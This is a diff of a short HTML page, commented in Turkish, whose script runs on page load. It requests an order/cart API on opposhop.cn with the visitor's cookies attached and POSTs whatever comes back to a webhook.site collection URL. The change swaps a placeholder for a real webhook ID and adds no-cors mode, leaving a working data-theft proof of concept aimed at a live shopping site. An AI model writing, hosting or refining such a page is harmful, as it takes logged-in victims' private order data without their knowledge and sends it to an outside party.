@@ -1,18 +1,44 @@
-<html>
-  <head>
-  </head>
-  <body>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Veri Aktarımı</title>
+</head>
+<body>
 <script>
-fetch("https://www.opposhop.cn/cn/oapi/orders/web/trade/cartbuy", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-  fetch("https://webhook.site/YOUR-ID", {
-    method: "POST",
-    body: data
-  });
-});
+  // Hedef URL'ler
+  const sourceUrl = "https://www.opposhop.cn/cn/oapi/orders/web/trade/cartbuy";
+  const webhookUrl = "https://webhook.site/fdf03ce1-ef9b-4809-a015-62020160f673";
+
+  async function transferData() {
+    try {
+      // 1. Kaynaktan veri çekme
+      const response = await fetch(sourceUrl, {
+        method: 'GET', // Veya işlemin gereğine göre 'POST'
+        credentials: "include"
+      });
+
+      if (!response.ok) {
+        throw new Error(`Kaynak hatası: ${response.status}`);
+      }
+
+      const data = await response.text();
+
+      // 2. Veriyi Webhook'a gönderme
+      await fetch(webhookUrl, {
+        method: "POST",
+        mode: "no-cors", // Webhook sitesi CORS hatası veriyorsa eklenebilir
+        body: data
+      });
+
+      console.log("Veri başarıyla aktarıldı.");
+    } catch (error) {
+      console.error("İşlem sırasında bir hata oluştu:", error);
+    }
+  }
+
+  // Fonksiyonu çalıştır
+  transferData();
 </script>
-  </body>
+</body>
 </html>
